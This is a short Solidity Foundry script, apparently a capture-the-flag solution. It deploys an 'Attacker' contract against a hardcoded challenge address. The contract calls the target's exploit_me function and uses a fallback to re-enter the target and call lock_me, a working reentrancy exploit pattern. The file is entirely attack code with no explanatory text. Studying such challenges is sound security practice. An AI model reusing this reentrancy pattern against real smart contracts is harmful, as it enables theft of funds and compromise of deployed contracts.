// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Script.sol";

contract Attacker {
    address target;
    bool called = false;
    
    constructor(address challengeAddress) {
        target = challengeAddress;
    }
    
    function attack(string memory name) external {
        (bool success,) = target.call(
            abi.encodeWithSignature("exploit_me(string)", name)
        );
        require(success, "Attack failed");
    }
    
    fallback() external {
        if (!called) {
            called = true;
            (bool success,) = target.call(
                abi.encodeWithSignature("lock_me()")
            );
            require(success, "Lock failed");
        }
    }
}

contract Deploy is Script {
    function run() external {
        vm.startBroadcast();  // Remove the privateKey parameter since it's passed via CLI

        address challengeAddress = 0x771F8f8FD270eD99db6a3B5B7e1d9f6417394249;
        
        Attacker attacker = new Attacker(challengeAddress);
        attacker.attack("Gifftybabe");

        vm.stopBroadcast();
    }
}